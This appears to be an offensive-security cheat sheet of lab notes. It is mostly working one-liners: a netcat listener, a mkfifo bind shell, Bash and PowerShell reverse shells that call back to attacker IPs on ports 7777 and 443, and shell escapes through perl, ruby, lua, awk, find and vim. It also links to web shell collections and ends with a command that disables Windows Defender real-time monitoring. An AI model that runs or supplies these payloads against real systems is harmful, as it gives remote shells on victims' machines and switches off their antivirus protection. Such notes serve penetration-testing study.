# Listeners

## Start a Listener using Netcat (nc)

```
nc -lvnp <PORT>
```
# Bind Shells

## **Establishing a Basic Bind Shell with Netcat**

#### Server
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <LISTEN_IP> <LISTEN_PORT> > /tmp/f
```
#### Client
```
nc -nv <SERVER_IP> <LISTEN_PORT>
```

# Reverse Shell

#### Source

[PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
## **Netcat/Bash Reverse Shell One-liner**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
## **Establishing a Basic Reverse Shell with Powershell**

#### Client (Target)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”
```

#### Server (Attack Box)

```
sudo nc -lvnp 443
```

## Using **Invoke-PowerShellTcp.ps1**

[Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
# Interactive Shells

## Interactive sh

```
/bin/sh -i
```
## Perl

**Running on CLI**

```
perl —e 'exec "/bin/sh";’
```

**Running on Script**

```
echo 'exec "/bin/sh";' > shell.pl

---------------

perl shell.pl
```
## **Ruby**

**Running on Script**

```
echo 'exec "/bin/sh";' > shell.rb

---------------

ruby shell.rb
```
## **Lua**

**Running  on Script**

```
echo 'os.execute('/bin/sh')' > shell.lua

--------------

lua shell.lua
```
## AWK

```
awk 'BEGIN {system("/bin/sh")}’
```

## Find

```
echo ‘anything’ > anythingFile
find / -name anythingFile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
### Using exec

```
find . -exec /bin/sh \; -quit
```

## **VIM**

```
vim -c ':!/bin/sh’
```
### Vim Escape

```
vim
:set shell=/bin/sh
:shell
```

# Web Shells

[Web-Shells - laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
# AV Detection

```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
  + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

## Disable AV

## **PowerShell console (admin):**

```
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```
